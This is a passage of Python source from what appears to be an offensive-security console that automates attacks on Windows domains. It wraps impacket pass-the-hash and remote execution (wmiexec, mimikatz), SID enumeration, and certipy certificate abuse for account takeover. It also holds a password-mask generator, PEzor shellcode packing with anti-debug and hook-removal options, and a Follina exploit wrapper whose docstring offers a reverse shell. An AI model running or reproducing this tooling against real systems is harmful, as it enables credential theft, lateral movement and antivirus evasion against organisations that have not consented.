            print_error(f"Hash not found. To create a hash use:{GREEN} createhash {RESET}")
            return

        hash_value = get_hash()
        command = f"nth -t \"{hash_value}\""

        print_msg(f"Executing command: {command}")
        self.cmd(command)

        return

    @cmd2.with_category(credential_access_category)
    def do_refill_password(self, line):
        """Generate a list of possible passwords by filling each asterisk in the input with user-specified characters.

        :param line: A string containing asterisks (e.g., WebAO***7) for generating variations.

        :returns: None

        Process:
        Prompts the user to enter characters to replace each asterisk, creates all possible combinations,
        and saves them to 'sessions/passwords_refilled.txt'. If this file exists, the previous version is
        renamed with a timestamp suffix.
        """
        path = os.getcwd()
        output_dir = f"{path}/sessions"
        output_file = os.path.join(output_dir, "passwords_refilled.txt")
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)

        if os.path.isfile(output_file):
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            os.rename(output_file, os.path.join(output_dir, f"passwords_refilled_{timestamp}.txt"))

        characters = input("    [!] Enter characters to replace '*': (default: 0123456789) ") or '0123456789'
        password_base = list(line)
        asterisk_positions = [i for i, char in enumerate(password_base) if char == '*']

        combinations = itertools.product(characters, repeat=len(asterisk_positions))
        with open(output_file, "w") as f:
            for combo in combinations:
                for pos, char in zip(asterisk_positions, combo):
                    password_base[pos] = char
                f.write("".join(password_base) + "\n")

        print_msg(f"Password variations saved to: {output_file}")

    @cmd2.with_category(credential_access_category)
    def do_sudo(self, line):
        """
        Checks if the script is running with superuser (sudo) privileges, and if not,
        restarts the script with sudo privileges.

        This function verifies if the script is being executed with root privileges
        by checking the effective user ID. If the script is not running as root,
        it prints a warning message and restarts the script using sudo.

        :return: None
        """
        check_sudo()

    @cmd2.with_category(scanning_category)
    def do_netview(self, line):
        """
        Executes the Impacket netview tool to list network shares on a specified target.

        This function performs the following actions:
        1. Checks if the target host is valid.
        2. If the line argument is "pass", it searches for credential files with the pattern `credentials*.txt`
        and allows the user to select which file to use for executing the command.
        3. If line is "hash", it searches for a hash file and prompts the user for a username, then constructs
        and executes the command with the hash.
        4. If line does not match "pass" or "hash", it displays an error message with usage instructions.

        Parameters:
        line (str): A command argument to determine the authentication mode.
                    If "pass", the function searches for credential files and authenticates using the selected file.
                    If "hash", it uses a hash file for authentication.
                    If neither, it prints an error message with usage instructions.

        Returns:
        None
        """
        rhost = self.params["rhost"]
        domain = self.params["domain"]
        path = os.getcwd()
        users_txt = f"{path}/sessions/users.txt"
        hash_txt = f"{path}/sessions/hash.txt"

        if not check_rhost(rhost):
            return

        if line == "pass":
            if not os.path.exists(f"{path}/sessions/credentials.txt"):
                print_error("Need credentials to use this options. use: createcredentials admin:admin")
                return
            credentials = get_credentials()
            if not credentials:
                return
            for user, passwd in credentials:
                command = f"impacket-netview -user {user} -target {domain} -dc-ip {rhost} {domain}/{user}:{passwd}"
                print_msg(command)
                self.cmd(command)
            return

        elif line == "hash":
            if not os.path.exists(hash_txt):
                print_error(f"{hash_txt} not found.")
                return
            hash_value = get_hash()
            if not hash_value:
                return
            if ":" in hash_value:
                hashis = f"-hashes {hash_value}"
            else:
                hashis = f"-hashes :{hash_value}"
            user = input("    [!] Enter Username (default: Administrator): ") or 'Administrator'
            command = f"impacket-netview -user {user} -target {domain} -dc-ip {rhost} {hashis} {domain}/{user}"
            print_msg(command)
            self.cmd(command)
            return

        else:
            print_error("Incorrect usage. Use 'pass' to authenticate with credentials or 'hash' to use a hash.")
            return

    @cmd2.with_category(lateral_movement_category)
    def do_wmiexec(self, line):
        """
        Executes the Impacket WMIExec tool to run commands on a target system using WMI.

        This function performs the following actions:
        1. Checks if the target IP is valid.
        2. If the line argument is "pass", it searches for credential files with the pattern `credentials*.txt`
        and allows the user to select which file to use for executing the command.
        3. If line is "hash", it searches for a hash file and prompts the user for a username, then constructs
        and executes the command with the hash.
        4. If line does not match "pass" or "hash", it displays an error message with usage instructions.

        Parameters:
        line (str): A command argument to determine the authentication mode.
                    If "pass", the function searches for credential files and authenticates using the selected file.
                    If "hash", it uses a hash file for authentication.
                    If neither, it prints an error message with usage instructions.

        Returns:
        None
        """
        rhost = self.params["rhost"]
        domain = self.params["domain"]
        path = os.getcwd()
        users_txt = f"{path}/sessions/users.txt"
        hash_txt = f"{path}/sessions/hash.txt"

        if not check_rhost(rhost):
            return

        if line == "pass":
            if not os.path.exists(f"{path}/sessions/credentials.txt"):
                print_error("Need credentials to use this options. use: createcredentials admin:admin")
                return
            credentials = get_credentials()
            if not credentials:
                return
            for user, passwd in credentials:
                command = f"impacket-wmiexec {domain}/{user}:{passwd}@{rhost} -dc-ip {rhost}"
                print_msg(command)
                self.cmd(command)
            return

        elif line == "hash":
            if not os.path.exists(hash_txt):
                print_error(f"{hash_txt} not found.")
                return
            hash_value = get_hash()
            if not hash_value:
                return
            if ":" in hash_value:
                hashis = f"-hashes {hash_value}"
            else:
                hashis = f"-hashes :{hash_value}"

            user = input("    [!] Enter Username (default: Administrator): ") or 'Administrator'
            command = f"impacket-wmiexec {domain}/{user}@{rhost} {hashis} -dc-ip {rhost}"
            print_msg(command)
            self.cmd(command)
            return

        else:
            print_error("Incorrect usage. Use 'pass' to authenticate with credentials or 'hash' to use a hash.")
            return

    @cmd2.with_category(reporting_category)
    def do_extract_ports(self, line):
        """
        Extracts open ports and IP address information from a specified file.

        This function performs the following actions:
        1. Reads the specified file to find open ports.
        2. If not port pass as an argument, Extracts the first unique IP address found in the file.
        3. Prints the extracted information to the console.

        Parameters:
        line (str): The port to get information.

        Returns:
        None
        """
        path = os.getcwd()

        file = f"{path}/puertos"
        if not os.path.isfile(file):
            print_error(f"File not found: {file}")
            return

        if line:
            ports = line.strip()
        else:
            ports = ','.join(
                re.findall(r'(\d{1,5})/open', open(file).read())
            )

        ip_address = sorted(
            set(re.findall(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', open(file).read()))
        )[0] if re.findall(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', open(file).read()) else "Not found"

        print_msg(f"Extracting info...")
        print_msg(f"IP Address: {ip_address}")
        print_msg(f"Open Ports: {ports}")
        print_warn("To enter use Ctrl + Clic: ")
        print_msg(f"{BLUE}{UNDERLINE}https://www.speedguide.net/ip/{ip_address}")
        print_msg(f"{BLUE}{UNDERLINE}https://otx.alienvault.com/browse/global/indicators?include_inactive=0&sort=-modified&page=1&limit=10&indicatorsSearch={ip_address}")
        print_msg(f"{BLUE}{UNDERLINE}https://viz.greynoise.io/ip/{ip_address}")
        print_msg(f"{BLUE}{UNDERLINE}https://search.censys.io/hosts/{ip_address}")
        print_msg(f"{BLUE}{UNDERLINE}https://talosintelligence.com/reputation_center/lookup?search={ip_address}")
        print_msg(f"{BLUE}{UNDERLINE}https://www.abuseipdb.com/check/{ip_address}")
        print_msg(f"{BLUE}{UNDERLINE}https://whatismyipaddress.com/ip/{ip_address}")
        print_msg(f"{BLUE}{UNDERLINE}https://ping.pe/{ip_address}")
        self.cmd(f"curl https://internetdb.shodan.io/{ip_address}")
        self.onecmd(f"ipinfo {ip_address}")
        for p in ports.split(","):
            print_msg(f"{BLUE}{UNDERLINE}https://www.speedguide.net/port.php?port={p}")
            telnet = f"telnet {ip_address} {p}"
            nc = f"nc -n  {ip_address} {p}"
            openssl = f"openssl s_client -connect  {ip_address}:{p}"
            print_msg(telnet)
            self.cmd(telnet)
            print_msg(nc)
            self.cmd(nc)
            print_msg(openssl)
            self.cmd(openssl)
            banner = get_banner(ip_address, p)
            if banner and banner not in ("No banner received (timed out)", "Connection reset by peer - no banner available"):
                print_msg(banner)
                self.onecmd(f"ss {banner}")
            else:
                print_warn(f"Port: {p} return: {banner}")
        return

    @cmd2.with_category(miscellaneous_category)
    def do_cron(self, line):
        """
        Schedules a command to run at a specified time.

        This function allows users to schedule a command to execute at a specific hour and minute.
        If the specified time has already passed for the current day, the command will be scheduled
        to run the following day.

        Usage:
            cron HH:MM command [args]

        Parameters:
        line (str): The input string containing the scheduled time in 'HH:MM' format followed by the command and arguments.

        Returns:
        None
        """
        if not line:
            print_error("Enter the hour and the command")
            return

        parts = line.split(maxsplit=1)
        if len(parts) != 2:
            print_error("Format: cron HH:MM command [args]")
            return

        time_str, command = parts
        try:
            schedule_time = datetime.strptime(time_str, '%H:%M').time()
            now = datetime.now().time()

            delta = datetime.combine(date.today(), schedule_time) - datetime.combine(date.today(), now)
            if delta.total_seconds() < 0:
                delta += timedelta(days=1)

            def lazyrun_command():
                self.onecmd(command)

            Timer(delta.total_seconds(), lazyrun_command).start()
            print_msg(f"Command scheduled for: {time_str}")

        except ValueError:
            print_error("Invalid format. Use cron HH:MM command [optional args]")
        return

    @cmd2.with_category(post_exploitation_category)
    def do_pezorsh(self, line):
        """
        Executes the PEzor tool to pack executables or shellcode with custom configurations.

        This function enables the user to construct commands for PEzor with various options.
        By default, parameters are prompted to ensure successful execution without failure due to
        missing values. It supports both executable and shellcode packing with the ability to
        select from a range of PEzor flags to create the desired payload.

        Functionalities of the function include:
        1. Prompting the user to specify if they want to pack an executable or shellcode.
        2. Gathering parameters for different PEzor flags based on user choices.
        3. Building the command dynamically to execute PEzor.sh with the configured options.

        Example commands the function can build:
        - Pack an executable with 64-bit, debug, and anti-debug options.
        - Pack shellcode with self-injection and sleep options.

        Usage:
            - Run 'PEzor <EXECUTABLE> [donut args...]' to pack an executable with donut options.
            - Run 'PEzor <SHELLCODE>' to pack shellcode.

        :param line: String containing initial command-line arguments or options.
        """
        pezor_git = "https://github.com/phra/PEzor.git"
        pezor_dir = os.path.join(os.getcwd(), "external/.exploit/PEzor")

        if not os.path.exists(pezor_dir):
            print_msg("Cloning PEzor repository...")
            self.cmd(f"git clone {pezor_git} {pezor_dir}")
            print_msg("Installing required dependencies...")
            self.cmd(f"cd {pezor_dir} && chmod +x {pezor_dir}/install.sh && {pezor_dir}/install.sh")
        else:
            print_msg("PEzor already installed, skipping setup.")

        executable_path = input("Enter path to the executable or shellcode file: ") or "sessions/shellcode.bin"
        pack_type = input("Specify 'exec' for executable or 'shellcode' for shellcode (default: exec): ") or "exec"
        options = []

        if pack_type == "exec":
            options.append(input("Enter any donut args (e.g., '-z 2'): ") or "")
        options.append("-32" if input("Force 32-bit executable? (y/n, default: n): ").lower() == "y" else "-64")
        if input("Enable debug mode? (y/n, default: n): ").lower() == "y":
            options.append("-debug")
        if input("Enable anti-debug checks? (y/n, default: n): ").lower() == "y":
            options.append("-antidebug")
        if input("Remove user-land hooks? (y/n, default: n): ").lower() == "y":
            options.append("-unhook")
        if pack_type == "exec" and input("Use syscalls (64-bit, Win10 only)? (y/n, default: n): ").lower() == "y":
            options.append("-syscalls")
        if input("Store in .text section? (y/n, default: n): ").lower() == "y":
            options.append("-text")
        if input("Use RX memory allocation? (y/n, default: n): ").lower() == "y":
            options.append("-rx")
        if input("Execute shellcode in the same thread? (y/n, default: n): ").lower() == "y":
            options.append("-self")
        options.append(f"-sleep={input('Set sleep time before unpacking (seconds): ') or '0'}")
        format_type = input("Specify output format (exe, dll, reflective-dll, service-exe, etc., default: exe): ") or "exe"
        options.append(f"-format={format_type}")
        fluctuate = input("Fluctuate memory protection? (RW or NA, default: none): ")
        if fluctuate:
            options.append(f"-fluctuate={fluctuate}")
        xorkey = input("Specify XOR key (optional): ")
        if xorkey:
            options.append(f"-xorkey={xorkey}")

        command = f"{pezor_dir}/PEzor.sh {executable_path} {' '.join(options)}"
        print_msg(f"Generated command: {command}")
        self.cmd(command)

    @cmd2.with_category(post_exploitation_category)
    def do_mimikatzpy(self, line):
        """
        Executes the Impacket Mimikatz tool to interact with a target system for credential-related operations.

        This function performs the following actions:
        1. Validates the target IP (rhost).
        2. If the line argument is "pass", it searches for credential files matching the pattern `credentials*.txt`
        and prompts the user to select a file for executing Mimikatz.
        3. If line is "hash", it searches for a hash file, prompts for a username, and constructs the command using
        the hash for authentication.
        4. If line does not match "pass" or "hash", it displays an error message with usage instructions.

        Parameters:
        line (str): Command argument specifying the authentication mode.
                    If "pass", the function authenticates using credentials from a selected file.
                    If "hash", it uses a hash file for authentication.
                    If neither, it displays an error message with usage instructions.

        Returns:
        None
        """
        rhost = self.params["rhost"]
        domain = self.params["domain"]
        path = os.getcwd()
        users_txt = f"{path}/sessions/users.txt"
        hash_txt = f"{path}/sessions/hash.txt"

        if not check_rhost(rhost):
            return

        if line == "pass":
            if not os.path.exists(f"{path}/sessions/credentials.txt"):
                print_error("Need credentials to use this options. use: createcredentials admin:admin")
                return
            credentials = get_credentials()

            if not credentials:
                return
            for user, passwd in credentials:
                command = f"env/bin/mimikatz.py {domain}/{user}:{passwd}@{rhost} -dc-ip {rhost}"
                print_msg(command)
                self.cmd(command)
            return

        elif line == "hash":
            if not os.path.exists(hash_txt):
                print_error(f"{hash_txt} not found.")
                return
            hash_value = get_hash()
            if not hash_value:
                return
            if ":" in hash_value:
                hashis = f"-hashes {hash_value}"
            else:
                hashis = f"-hashes :{hash_value}"

            user = input("    [!] Enter Username (default: Administrator): ") or 'Administrator'
            command = f"env/bin/mimikatz.py {domain}/{user}@{rhost} {hashis} -dc-ip {rhost}"
            print_msg(command)
            self.cmd(command)
            return

        else:
            print_error("Incorrect usage. Use 'pass' to authenticate with credentials or 'hash' to use a hash.")
            return

    @cmd2.with_category(scanning_category)
    def do_rdp_check_py(self, line):
        """
        Executes the RDP check tool to verify credentials or hash-based authentication on a target system.

        This function performs the following actions:
        1. Validates the target IP (rhost).
        2. If the line argument is "pass", it searches for credential files with the pattern `credentials*.txt`
        and prompts the user to select one to execute the RDP check.
        3. If line is "hash", it searches for a hash file, prompts the user for a username, and constructs the command
        using the hash for authentication.
        4. If line does not match "pass" or "hash", it displays an error message with usage instructions.

        Parameters:
        line (str): Command argument specifying the authentication mode.
                    If "pass", the function authenticates using credentials from a selected file.
                    If "hash", it uses a hash file for authentication.
                    If neither, it displays an error message with usage instructions.

        Returns:
        None
        """
        rhost = self.params["rhost"]
        domain = self.params["domain"]
        path = os.getcwd()
        users_txt = f"{path}/sessions/users.txt"
        hash_txt = f"{path}/sessions/hash.txt"

        if not check_rhost(rhost):
            return

        if line == "pass":
            if not os.path.exists(f"{path}/sessions/credentials.txt"):
                print_error("Need credentials to use this options. use: createcredentials admin:admin")
                return
            credentials = get_credentials()
            if not credentials:
                return
            for user, passwd in credentials:
                command = f"env/bin/rdp_check.py {domain}/{user}:{passwd}@{rhost}"
                print_msg(command)
                self.cmd(command)
            return

        elif line == "hash":
            if not os.path.exists(hash_txt):
                print_error(f"{hash_txt} not found.")
                return
            hash_value = get_hash()
            if not hash_value:
                return
            if ":" in hash_value:
                hashis = f"-hashes {hash_value}"
            else:
                hashis = f"-hashes :{hash_value}"

            user = input("    [!] Enter Username (default: Administrator): ") or 'Administrator'
            command = f"env/bin/rdp_check.py {domain}/{user}@{rhost} {hashis}"
            print_msg(command)
            self.cmd(command)
            return

        else:
            print_error("Incorrect usage. Use 'pass' to authenticate with credentials or 'hash' to use a hash.")
            return

    @cmd2.with_category(scanning_category)
    def do_mqtt_check_py(self, line):
        """
        Executes the MQTT check tool to verify credentials on a target system with optional SSL.

        This function performs the following actions:
        1. Validates the target IP (rhost).
        2. If the line argument is "pass", it searches for credential files matching the pattern `credentials*.txt`
        and prompts the user to select one to execute the MQTT check.
        3. If line is "ssl", it performs the MQTT check with SSL enabled using the selected credentials.
        4. If line does not match "pass" or "ssl", it displays an error message with usage instructions.

        Parameters:
        line (str): Command argument specifying the authentication mode.
                    If "pass", the function authenticates using credentials from a selected file.
                    If "ssl", it authenticates using SSL.
                    If neither, it displays an error message with usage instructions.

        Returns:
        None
        """
        rhost = self.params["rhost"]
        domain = self.params["domain"]
        path = os.getcwd()
        users_txt = f"{path}/sessions/users.txt"

        if not check_rhost(rhost):
            return

        if line == "pass":
            if not os.path.exists(f"{path}/sessions/credentials.txt"):
                print_error("Need credentials to use this options. use: createcredentials admin:admin")
                return
            credentials = get_credentials()
            if not credentials:
                return
            for user, passwd in credentials:
                command = f"env/bin/mqtt_check.py {domain}/{user}:{passwd}@{rhost}"
                print_msg(command)
                self.cmd(command)
            return

        elif line == "ssl":
            credentials = get_credentials()
            if not credentials:
                return
            for user, passwd in credentials:
                command = f"env/bin/mqtt_check.py {domain}/{user}:{passwd}@{rhost} -ssl"
                print_msg(command)
                self.cmd(command)
            return

        else:
            print_error("Incorrect usage. Use 'pass' to authenticate with credentials or 'ssl' to enable SSL.")
            return

    @cmd2.with_category(scanning_category)
    def do_lookupsid_py(self, line):
        """
        Executes the LookupSID tool to perform SID enumeration on a target system.

        This function performs the following actions:
        1. Validates the target IP (rhost).
        2. If the line argument is "basic", it searches for credential files with the pattern `credentials*.txt`
        and prompts the user to select one to execute the SID lookup.
        3. If line is "dc-target", it performs the SID lookup specifying domain controller and target IPs,
        using the selected credentials.
        4. If line does not match "basic" or "dc-target", it displays an error message with usage instructions.

        Parameters:
        line (str): Command argument specifying the lookup mode.
                    If "basic", the function performs a standard SID lookup.
                    If "dc-target", it includes `-dc-ip` and `-target-ip` arguments.
                    If "nopass", We run lookupsid.py , using an arbitrary username prepended to the target's IP address
                    If neither, it displays an error message with usage instructions.

        Returns:
        None
        """
        rhost = self.params["rhost"]
        domain = self.params["domain"]
        path = os.getcwd()
        users_txt = f"{path}/sessions/users.txt"

        if not check_rhost(rhost):
            return

        if line == "basic":
            if not os.path.exists(f"{path}/sessions/credentials.txt"):
                print_error("Need credentials to use this options. use: createcredentials admin:admin")
                return
            credentials = get_credentials()
            if not credentials:
                return
            for user, passwd in credentials:
                command = f"lookupsid.py {domain}/{user}:{passwd}@{rhost}"
                print_msg(command)
                self.cmd(command)
                self.cmd(f"{command}  | grep 'SidTypeUser' | sed 's/.*\\\ (.*\) (SidTypeUser)/\1/' > usernames.txt")
            return

        elif line == "dc-target":
            if not os.path.exists(f"{path}/sessions/credentials.txt"):
                print_error("Need credentials to use this options. use: createcredentials admin:admin")
                return
            dc_ip = input(f"    [!] Enter Domain Controller IP (default: {rhost}): ") or rhost
            target_ip = input(f"    [!] Enter Target IP (default: {rhost}): ") or rhost
            if not dc_ip or not target_ip:
                print_error("Domain Controller and Target IPs are required for 'dc-target' mode.")
                return
            credentials = get_credentials()
            if not credentials:
                return
            for user, passwd in credentials:
                command = f"env/bin/lookupsid.py -domain-sids -target-ip {target_ip} {domain}/{user}:{passwd}"
                print_msg(command)
                self.cmd(command)
            return
        elif line == "nopass":
            increase = input("    [!] We increase this limit to (default 10000) ") or '10000'
            command = f"lookupsid.py nan@{rhost} {increase} -no-pass | grep 'SidTypeUser' | sed 's/.*\\(.*\\) \\(SidTypeUser\\)/\\1/' > sessions/{rhost}_lookupsid_usernames.txt"
            print_msg(command)
            self.cmd(command)

        else:
            print_error("Incorrect usage. Use 'basic' for standard SID lookup or 'dc-target' to specify IPs.")
            return

    @cmd2.with_category(post_exploitation_category)
    def do_scavenger(self, line):
        """
        Executes the Scavenger tool for multi-threaded post-exploitation scanning on target systems with SMB credentials.

        This function performs the following actions:
        1. Checks if Scavenger is installed; if not, it clones the repository and installs dependencies.
        2. If the line argument is "pass", it searches for credential files matching `credentials*.txt`,
           prompts the user to select one, and executes Scavenger using the chosen credentials on a single target IP.
        3. If the line argument is "targets", it prompts for an IP list file (`iplist`) and uses Scavenger with
           credentials from a selected file on multiple target IPs with the `--overwrite` option.
        4. If line does not match "pass" or "targets", it displays an error message with usage instructions.

        Parameters:
        line (str): Command argument specifying the authentication mode.
                    - If "pass", authenticates with credentials from a selected file on a single target IP.
                    - If "targets", authenticates on multiple targets from a provided IP list file.
                    - If neither, displays an error message with usage instructions.

        Returns:
        None
        """
        path = os.getcwd()
        scavenger_git = "https://github.com/SpiderLabs/scavenger.git"
        scavenger_dir = os.path.join(os.getcwd(), "external/.exploit/scavenger")
        rhost = self.params["rhost"]
        domain = self.params["domain"]

        if not os.path.exists(scavenger_dir):
            print_msg("Cloning Scavenger repository...")
            self.cmd(f"git clone {scavenger_git} {scavenger_dir}")

        else:
            print_msg("Scavenger already installed, skipping setup.")

        if line == "pass":
            if not os.path.exists(f"{path}/sessions/credentials.txt"):
                print_error("Need credentials to use this options. use: createcredentials admin:admin")
                return
            credentials = get_credentials()
            if not credentials:
                return
            for user, passwd in credentials:
                command = f"sudo python3 {scavenger_dir}/scavenger.py smb -t {rhost} -u {user} -p {passwd} -d {domain}"
                print_msg(f"Executing command: {command}")
                self.cmd(command)
            return

        elif line == "targets":
            ip_list = input("    [!] Enter path to the IP list file (e.g., iplist): ")
            if not os.path.exists(ip_list):
                print_error(f"IP list file '{ip_list}' not found.")
                return

            credentials = get_credentials()
            if not credentials:
                return
            for user, passwd in credentials:
                command = f"sudo python3 {scavenger_dir}/scavenger.py smb --target {ip_list} --username {user} --password {passwd} --domain {domain} --overwrite"
                print_msg(f"Executing command: {command}")
                self.cmd(command)
            return

        else:
            print_error("Incorrect usage. Use 'pass' for single target or 'targets' with an IP list.")
            return

    @cmd2.with_category(recon_category)
    def do_binarycheck(self, line):
        """
        Performs various checks on a selected binary to gather information and protections.

        This function executes the following checks:
        1. Checks program protections using checksec.
        2. Displays information about the ELF binary using readelf.
        3. Retrieves the address of the system() function using objdump.
        4. Searches for a known string within the binary using objdump.
        5. Generates a cyclic pattern for padding using pwntools.
        6. Lists gadgets in the binary using ROPgadget.

        Parameters:
        line (str): Command argument not used in this function.

        Returns:
        None
        """

        binaries_list = list_binaries()
        if not binaries_list:
            print_error("No binaries found in the specified directory.")
            return

        selected_binary = select_binary(binaries_list)

        print_msg(f"Checking protections for {selected_binary}...")
        self.cmd(f"checksec --file {selected_binary}")

        print_msg(f"Getting ELF information for {selected_binary}...")
        self.cmd(f"readelf -a {selected_binary}")

        print_msg(f"Getting system() address for {selected_binary}...")
        self.cmd(f"objdump -D {selected_binary} | grep system")

        print_msg(f"Looking for known strings in {selected_binary}...")
        self.cmd(f"objdump -s {selected_binary} | grep 'GNU'")

        print_msg(f"Generating padding using pwntools for {selected_binary}...")


        print_msg(f"Listing gadgets for {selected_binary}...")
        self.cmd(f"env/bin/ROPgadget --binary {selected_binary}")

    @cmd2.with_category(scanning_category)
    def do_lookupsid(self, line):
        """
        Executes the Impacket lookupsid tool to enumerate SIDs on a target system.

        This function performs the following actions:
        1. Validates the target IP (or hostname) specified in the line argument.
        2. If the line argument is "pass", it searches for credential files with the pattern credentials*.txt
        and prompts the user to select one to execute the lookupsid command.
        3. If line is "hash", it prompts the user for a username and constructs the command using the hash for authentication.
        4. If line does not match "pass" or "hash", it displays an error message with usage instructions.

        Parameters:
        line (str): Command argument specifying the authentication mode.
                    If "pass", the function authenticates using credentials from a selected file.
                    If "hash", it uses a hash file for authentication.
                    If neither, it displays an error message with usage instructions.

        Returns:
        None
        """
        rhost = self.params["rhost"]
        domain = self.params["domain"]
        path = os.getcwd()
        credentials_path = f"{path}/sessions/credentials.txt"
        hash_txt = f"{path}/sessions/hash.txt"

        if line == "pass":
            if not os.path.exists(credentials_path):
                print_error("Need credentials to use this option. Use: createcredentials admin:admin")
                return
            credentials = get_credentials()
            if not credentials:
                return
            for user, passwd in credentials:
                command = f"impacket-lookupsid {domain}/{user}:{passwd}@{rhost}"
                print_msg(command)
                self.cmd(command)
            return

        elif line == "hash":
            if not os.path.exists(hash_txt):
                print_error(f"{hash_txt} not found.")
                return
            hash_value = get_hash()
            if not hash_value:
                return
            if ":" in hash_value:
                hashis = f"-hashes {hash_value}"
            else:
                hashis = f"-hashes :{hash_value}"

            user = input("    [!] Enter Username (default: Administrator): ") or 'Administrator'
            command = f"impacket-lookupsid {domain}/{user}@{rhost} {hashis}"
            print_msg(command)
            self.cmd(command)
            return

        else:
            print_error("Incorrect usage. Use 'pass' to authenticate with credentials or 'hash' to use a hash.")
            return

    @cmd2.with_category(scanning_category)
    def do_certipy_ad(self, line):
        target = self.params["rhost"]
        domain = self.params["domain"]
        subdomain = self.params["subdomain"]
        credentials = get_credentials()
        for user, passwd in credentials:
            pass

        if not credentials:
            return
        if line.startswith("shadow"):
            username = user
            password = passwd
            account = input("    [!] Enter Account for shadow abuse (default WINRM_SVC): ") or 'WINRM_SVC'
            command = f"certipy-ad shadow auto -u '{username}@{domain}' -p '{password}' -account '{account}' -dc-ip {target}"
            self.cmd(command)

        elif line.startswith("vuln"):
            hash_content = get_hash()
            username = user
            password = passwd
            account = input("    [!] Enter Account for vulnerable abuse (default CA_SVC): ") or 'CA_SVC'
            command = f"certipy-ad find -vulnerable -u {account} -hashes \":{hash_content}\" -dc-ip {target}"
            self.cmd(command)

        elif line.startswith("find"):
            hash_content = get_hash()
            account = input("    [!] Enter Account for find abuse (default CA_SVC): ") or 'CA_SVC'
            command = f"certipy-ad find -username {account} -hashes :{hash_content} -dc-ip {target} -vulnerable"
            self.cmd(command)

        elif line.startswith("acount"):

            account = input("    [!] Enter Account for account abuse (default CA_SVC): ") or 'CA_SVC'
            command = f"certipy-ad account -u '{user}@{domain}' -p '{passwd}' -dc-ip '{target}' -user '{account}' read"
            self.cmd(command)
            upn = input("    [!] Enter Account for upn (default administrator): ") or 'administrator'
            command = f"certipy-ad account -u '{user}@{domain}' -p '{passwd}' -dc-ip '{target}' -upn '{upn}'  -user '{account}' update"
            self.cmd(command)

        elif line.startswith("auth"):
            account = input("    [!] Enter Account for username (default administrator): ") or 'administrator'
            pfx_file = get_users_dic("pfx")
            if not pfx_file:
                return
            command = f"certipy auth -dc-ip '{target}' -pfx '{pfx_file}' -username '{account}' -domain '{domain}'"
            self.cmd(command)

        else:
            print_error("Enter valid option shadow or vuln")
            return
        return
    @cmd2.with_category(scanning_category)
    def do_certipy(self, line):
        """
        Executes the Certipy tool to interact with Active Directory Certificate Services.

        This function performs the following actions:
        1. Validates the target IP or hostname specified in the line argument.
        2. If line is "find", it executes the certipy find command to enumerate AD CS.
        3. If line is "shadow", it prompts for an account and executes the certipy shadow command.
        4. If line is "req", it prompts for user details and executes the certipy req command to request a certificate.
        5. If line is "auth", it prompts for PFX details and executes the certipy auth command for authentication.
        6. If line is "update", it prompts for user details and executes the certipy account update command.
        7. If line does not match any valid actions, it displays an error message with usage instructions.

        Parameters:
        line (str): Command argument specifying the action mode.
                    If "find", it enumerates AD CS.
                    If "shadow", it abuses shadow credentials for account takeover.
                    If "req", it requests a certificate.
                    If "auth", it authenticates using a PFX file.
                    If "update", it updates user information.
                    If none of these, it displays an error message with usage instructions.

        Returns:
        None
        """
        target = self.params["rhost"]
        domain = self.params["domain"]

        if line == "find":
            user = input("    [!] Enter Username (default: Administrator): ") or 'Administrator'
            command = f"certipy find -k -no-pass -u {domain}/{user}@{target} -dc-ip {target} -target {target}"
            print_msg(command)
            self.cmd(command)
            return

        elif line == "shadow":
            user = input("    [!] Enter Username (default: Administrator): ") or 'Administrator'
            account = input("    [!] Enter Account for shadow abuse: ")
            command = f"certipy shadow auto -k -no-pass -u {domain}/{user}@{target} -dc-ip {target} -target {target} -account {account}"
            print_msg(command)
            self.cmd(command)
            return

        elif line == "req":
            user = input("    [!] Enter Username for certificate request: ")
            password = input("    [!] Enter password for certificate request: ")
            ca = input("    [!] Enter CA name (default: certified-DC01-CA): ") or 'certified-DC01-CA'
            template = input("    [!] Enter template name (default: CertifiedAuthentication): ") or 'CertifiedAuthentication'
            command = f"certipy req -username {user}@{domain} -p {password} -ca {ca} -template {template}"
            command2 = f"certipy req -u {user}@{domain} -p {password} -upn administrator@{domain} -target {domain} -ca sequel-dc-ca -template UserAuthentication"
            choice = input(f"    [!] {WHITE}Enter the choice 1 to {GREEN}{command}{WHITE} 2 to {GREEN}{command2}{RESET}") or '1'
            if choice == '1':
                print_msg(command)
                self.cmd(command)
            else:
                cert = input("Enter the name of certificate default: sequel-dc-ca ") or 'sequel-dc-ca'
                command2 = f"certipy req -u {user}@{domain} -p {password} -upn administrator@{domain} -target {domain} -ca {cert} -template UserAuthentication"
                print_msg(command2)
                self.cmd(command2)
            return

        elif line == "auth":
            pfx_file = get_users_dic("pfx")
            if not pfx_file:
                return
            command = f"certipy auth -pfx {pfx_file} -domain {domain}"
            print_msg(command)
            self.cmd(command)
            return

        elif line == "update":
            user = input("    [!] Enter Username to update: ")
            new_upn = input("    [!] Enter new UPN for user: ")
            command = f"certipy account update -username {user}@{domain} -upn {new_upn}"
            print_msg(command)
            self.cmd(command)
            return

        else:
            print_error("Incorrect usage. Use 'find' to enumerate AD CS, 'shadow' to abuse shadow credentials, 'req' to request a certificate, 'auth' to authenticate with PFX, or 'update' to change user information.")
            return

    @cmd2.with_category(post_exploitation_category)
    def do_follina(self, line):
        """
        Executes the MSDT Follina exploit tool to create malicious documents for exploitation.

        This function performs the following actions:
        1. Checks if follina.py is available; if not, it clones the repository and installs dependencies.
        2. If the line argument is "default", it runs the tool with default parameters to pop calc.exe.
        3. If the line argument is "notepad", it runs the tool to pop notepad.exe.
        4. If the line argument is "reverse", it prompts for a port and runs the tool to get a reverse shell.
        5. If the line does not match any valid options, it displays an error message with usage instructions.

        Parameters:
        line (str): Command argument specifying the action mode.
                    - If "default", executes with default parameters.
                    - If "notepad", executes to pop notepad.exe.
                    - If "reverse", prompts for a port and executes for a reverse shell.
                    - If neither, displays an error message with usage instructions.

        Returns:
        None
        """
        lport = self.params["lport"]
        lhost = self.params["lhost"]
        device = self.params["device"]
        path = os.getcwd()
        sessions = f"{path}/sessions"
        index = f"{sessions}/index.html"
        follina_git = "https://github.com/JohnHammond/msdt-follina.git"
        follina_dir = os.path.join(os.getcwd(), "external/.exploit/msdt-follina")
        choice = input("    [?] Do you want execute: download_resources (y/n)") or 'n'
        if choice == "y":
            self.onecmd("download_resources")
            cmd = "cd sessions && unzip netcat-win32-1.12.zip"
            self.cmd(cmd)
